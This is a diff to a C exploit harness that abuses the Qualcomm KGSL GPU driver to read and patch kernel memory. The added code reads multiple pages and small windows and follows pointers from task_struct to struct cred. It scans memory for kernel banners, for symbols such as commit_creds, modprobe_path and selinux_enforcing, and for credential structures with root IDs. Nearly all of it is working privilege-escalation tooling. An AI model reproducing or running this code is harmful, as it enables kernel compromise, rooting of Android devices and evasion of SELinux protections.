@@ -52,6 +52,9 @@ static uint32_t ctx_id = 0;
 static uint64_t ib_gpu = 0, dst_gpu = 0;
 static void *ib_vma = NULL, *dst_vma = NULL;
 static uint32_t ib_id = 0, dst_id = 0;
+// Scratch page for read_gpu_window / read_gpu_page callers that don't want
+// to allocate their own buffer on the stack.
+static uint8_t tmp_page[PAGE_SIZE];
 
 void cleanup_kgsl() {
     if (ib_vma && ib_vma != MAP_FAILED) munmap(ib_vma, PAGE_SIZE * 2);
@@ -173,6 +176,28 @@ int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
     return 0;
 }
 
+// Read N consecutive pages starting at src_gpu_va into out_buf.
+// Returns 0 on success, -1 on any failed page.
+// Used to catch offsets that straddle page boundaries.
+int read_gpu_pages(uint64_t src_gpu_va, uint8_t *out_buf, int n_pages) {
+    for (int i = 0; i < n_pages; i++) {
+        if (read_gpu_page(src_gpu_va + (uint64_t)i * PAGE_SIZE,
+                          out_buf + (size_t)i * PAGE_SIZE) != 0) {
+            return -1;
+        }
+    }
+    return 0;
+}
+
+// Read a small window (max 256 bytes) at exactly src_gpu_va + off.
+// Faster than read_gpu_page when we only care about a few bytes.
+int read_gpu_window(uint64_t src_gpu_va, int off, int size, uint8_t *out) {
+    if (off < 0 || size <= 0 || off + size > PAGE_SIZE) return -1;
+    if (read_gpu_page(src_gpu_va, tmp_page) != 0) return -1;
+    memcpy(out, tmp_page + off, size);
+    return 0;
+}
+
 int write_gpu_mem(uint64_t dst_gpu_va, uint8_t *src_buf, int size) {
     memcpy(dst_vma, src_buf, size);
     return gpu_mem_op(dst_gpu, dst_gpu_va, size);
@@ -276,6 +301,71 @@ int main(int argc, char **argv) {
             } else {
                 printf("READ_FAILED\n");
             }
+        } else if (strncmp(line, "readN ", 6) == 0) {
+            // Read N consecutive pages (1..8) starting at addr. Returns
+            // one contiguous DATA blob of N*PAGE_SIZE bytes. Catches
+            // offsets/pointers that straddle a page boundary.
+            uint64_t addr;
+            int n;
+            if (sscanf(line + 6, "%lx %d", &addr, &n) != 2 || n < 1 || n > 8) {
+                printf("BAD_ARGS\n");
+            } else {
+                static uint8_t big[8 * 4096];
+                if (read_gpu_pages(addr, big, n) == 0) {
+                    printf("DATA:%lx:%d\n", (unsigned long)addr, n * PAGE_SIZE);
+                    fwrite(big, 1, n * PAGE_SIZE, stdout);
+                    printf("\nDATA_END\n");
+                } else {
+                    printf("READ_FAILED\n");
+                }
+            }
+            fflush(stdout);
+        } else if (strncmp(line, "window ", 7) == 0) {
+            // Read `size` bytes at addr+off. Catches small windows
+            // without paying for a full page read.
+            uint64_t addr;
+            int off, size;
+            if (sscanf(line + 7, "%lx %d %d", &addr, &off, &size) != 3 ||
+                size <= 0 || size > 256 || off < 0 || off + size > 4096) {
+                printf("BAD_ARGS\n");
+            } else {
+                uint8_t small[256];
+                if (read_gpu_window(addr, off, size, small) == 0) {
+                    printf("DATA:%lx:%d\n", (unsigned long)(addr + off), size);
+                    fwrite(small, 1, size, stdout);
+                    printf("\nDATA_END\n");
+                } else {
+                    printf("READ_FAILED\n");
+                }
+            }
+            fflush(stdout);
+        } else if (strncmp(line, "follow ", 7) == 0) {
+            // Read 8 bytes at addr as a 64-bit pointer, then read a
+            // full page at that pointer. Returns the dereferenced page.
+            // Used to walk: task_struct.cred -> struct cred -> ...
+            uint64_t addr;
+            if (sscanf(line + 7, "%lx", &addr) != 1) {
+                printf("BAD_ARGS\n");
+            } else {
+                uint8_t ptr_buf[8];
+                if (read_gpu_window(addr, 0, 8, ptr_buf) != 0) {
+                    printf("READ_FAILED\n");
+                } else {
+                    uint64_t target;
+                    memcpy(&target, ptr_buf, 8);
+                    printf("FOLLOW:%lx\n", (unsigned long)target);
+                    fflush(stdout);
+                    uint8_t page[PAGE_SIZE];
+                    if (read_gpu_page(target, page) == 0) {
+                        printf("DATA:%lx:%d\n", (unsigned long)target, PAGE_SIZE);
+                        fwrite(page, 1, PAGE_SIZE, stdout);
+                        printf("\nDATA_END\n");
+                    } else {
+                        printf("READ_FAILED_AT:%lx\n", (unsigned long)target);
+                    }
+                }
+            }
+            fflush(stdout);
         } else if (strncmp(line, "patch ", 6) == 0) {
             uint64_t addr;
             uint32_t val;
@@ -343,6 +433,61 @@ int main(int argc, char **argv) {
                                             break;
                                         }
                                     }
+                                }
+                            }
+                        }
+                    }
+                    // 7. Linux version banner — strong kernel indicator
+                    if (!found_sig) {
+                        p = memmem(buf, PAGE_SIZE, "Linux version", 13);
+                        if (p) { found_sig = 7; found_off = (int)((uint8_t*)p - buf); }
+                    }
+                    // 8. Kernel text/data markers (device-agnostic)
+                    if (!found_sig) {
+                        static const char *markers[] = {
+                            "kgsl-3d0", "slub", "cred_jar", "task_struct",
+                            "kmem_cache", "modprobe_path", "core_pattern",
+                            "poweroff_cmd", "selinux_enabled", "kptr_restrict",
+                            "mdss_fb", "init_cred_cache", "selinux_enforcing",
+                            "do_group_exit", "commit_creds", "prepare_kernel_cred",
+                            "override_creds", "revert_creds", "abort_creds",
+                        };
+                        for (size_t m = 0; m < sizeof(markers)/sizeof(markers[0]); m++) {
+                            int len = (int)strlen(markers[m]);
+                            p = memmem(buf, PAGE_SIZE, markers[m], len);
+                            if (p) {
+                                found_sig = 8;
+                                found_off = (int)((uint8_t*)p - buf);
+                                break;
+                            }
+                        }
+                    }
+                    // 9. Heap pattern — init_cred-like structure: u32 usage=1..3,
+                    //    then uid=gid=suid=sgid=euid=egid=0 (root).
+                    //    Look for "01 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 ..."
+                    //    at the very start of the page, AND a kernel pointer
+                    //    somewhere in the first 0x80 bytes (security/cred member).
+                    if (!found_sig) {
+                        uint32_t usage, uid, gid, suid, sgid, euid, egid;
+                        memcpy(&usage, buf + 0,  4);
+                        memcpy(&uid,    buf + 4,  4);
+                        memcpy(&gid,    buf + 8,  4);
+                        memcpy(&suid,   buf + 12, 4);
+                        memcpy(&sgid,   buf + 16, 4);
+                        memcpy(&euid,   buf + 20, 4);
+                        memcpy(&egid,   buf + 24, 4);
+                        if (usage > 0 && usage < 100 &&
+                            uid == 0 && gid == 0 && suid == 0 &&
+                            sgid == 0 && euid == 0 && egid == 0) {
+                            // Look for a kernel pointer in the next 0x40 bytes
+                            for (int i = 32; i < 128 && i + 8 <= PAGE_SIZE; i += 8) {
+                                uint64_t p2;
+                                memcpy(&p2, buf + i, 8);
+                                if ((p2 >> 32) >= 0xffffff80 &&
+                                    (p2 >> 40) <= 0xffffffcf && p2 != 0) {
+                                    found_sig = 9;
+                                    found_off = 0;
+                                    break;
                                 }
                             }
                         }
